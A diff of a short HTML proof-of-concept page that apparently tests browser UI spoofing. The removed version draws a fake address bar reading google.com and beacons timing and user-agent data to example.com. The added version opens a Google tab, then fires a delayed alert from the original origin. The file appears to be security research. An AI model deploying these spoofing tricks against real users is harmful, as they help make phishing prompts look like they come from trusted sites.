@@ -1,108 +1,40 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Navigation Race Condition Test</title>
+<title>Alert / Tab Focus Confusion PoC</title>
 <style>
-  body {
-    font-family: system-ui, sans-serif;
-    background: #020617;
-    color: #e5e7eb;
-    padding: 40px;
-  }
-  button {
-    padding: 14px 22px;
-    font-size: 16px;
-    border-radius: 8px;
-    border: none;
-    cursor: pointer;
-    background: #2563eb;
-    color: #fff;
-  }
-  #fakebar {
-    display: none;
-    position: fixed;
-    top: 0; left: 0; right: 0;
-    height: 38px;
-    background: #0f172a;
-    color: #94a3b8;
-    padding: 8px 16px;
-    font-size: 14px;
-    border-bottom: 1px solid #1e293b;
-  }
-  pre {
-    margin-top: 20px;
-    background: #020617;
-    padding: 15px;
-    border-radius: 8px;
-    font-size: 13px;
-    border: 1px solid #1e293b;
-  }
+body {
+  font-family: Arial, sans-serif;
+  padding: 40px;
+}
+button {
+  padding: 14px 22px;
+  font-size: 16px;
+}
 </style>
 </head>
-
 <body>
 
-<div id="fakebar">https://www.google.com</div>
-
-<h1>Address Bar / Navigation Race Detector</h1>
+<h2>Alert Timing After Tab Navigation</h2>
 <p>
-This PoC measures whether JavaScript callbacks still execute
-after navigation has begun.
+This test attempts to show an alert shortly after a new tab is opened.
 </p>
 
-<button onclick="runTest()">Run Test</button>
-<pre id="log"></pre>
+<button onclick="run()">Open Tab + Alert</button>
 
 <script>
-const DELAY = 100; // ubah 0–100 ms
+function run() {
+  // 1) Open new tab first
+  window.open("https://www.google.com", "_blank");
 
-function log(msg) {
-  document.getElementById("log").textContent += msg + "\n";
-}
-
-function beacon(data) {
-  navigator.sendBeacon(
-    "https://example.com/log",
-    JSON.stringify(data)
-  );
-}
-
-function runTest() {
-  const t0 = performance.now();
-  log("[+] Clicked at " + t0.toFixed(2) + " ms");
-
-  // Fake address bar (visual test)
-  document.getElementById("fakebar").style.display = "block";
-
-  // Delayed alert
+  // 2) Slight delay before alert (race window)
   setTimeout(() => {
-    const t1 = performance.now();
-    log("[!] Alert executed at " + t1.toFixed(2) + " ms");
-    alert("Delayed JS executed after navigation start");
-
-    beacon({
-      phase: "alert",
-      time: t1,
-      delay: DELAY,
-      ua: navigator.userAgent
-    });
-  }, DELAY);
-
-  // Trigger navigation
-  setTimeout(() => {
-    const nav = performance.now();
-    log("[+] Navigation triggered at " + nav.toFixed(2) + " ms");
-
-    beacon({
-      phase: "navigation",
-      time: nav,
-      delay: DELAY,
-      ua: navigator.userAgent
-    });
-
-    window.location.href = "https://www.google.com";
-  }, 0);
+    alert(
+      "Alert from ORIGINAL origin\n\n" +
+      "JS Origin: " + location.origin
+    );
+  }, 50); // try 20–100 ms
 }
 </script>
 
